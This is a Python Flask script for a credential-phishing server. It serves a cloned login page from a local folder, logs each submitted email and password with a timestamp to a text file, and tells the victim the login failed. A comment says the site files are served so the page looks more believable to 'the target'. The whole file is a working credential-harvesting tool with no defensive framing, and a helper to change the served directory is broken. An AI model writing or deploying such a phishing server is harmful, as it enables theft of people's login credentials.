from flask import Flask, request, render_template_string, abort, send_from_directory
import datetime
import os


app = Flask(__name__)
#temp project to change the login back to normal
BASE_DIR = r".\WebsiteStuff\Login_v4"
BASE_FILE = r"index.html"



@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with open("Loginlog.txt", "a") as f:
            f.write(f"{datetime.datetime.now()} | {email}:{password}\n")
        return "Login failed. Try again later."
    return send_from_directory(BASE_DIR, BASE_FILE)

#this is the file path to the website structure files for the target to get to make the website more believable
@app.route('/<path:filepath>')
def serve_file(filepath):
    full_path = os.path.join(BASE_DIR, filepath)

    if not os.path.isfile(full_path):
        abort(404)

    directory = os.path.dirname(full_path)
    filename = os.path.basename(full_path)
    return send_from_directory(directory, filename)

def run():
    app.run(host='0.0.0.0', port=5001)

        
def changewebsiteDir(inp):
    if os.path.isdir(inp):
        BASE_DIR = inp
        print(f"dir changed to {inp}")
    else:
        print(f"Directory '{inp}' does not exist.")
        
def changewebsiteBase(inp):
    if os.path.exists(inp):
        BASE_FILE = inp
        print(f"Base changed to {inp}")
    else:
        print(f"File does not exist: {inp}")
        
    
    
    
    
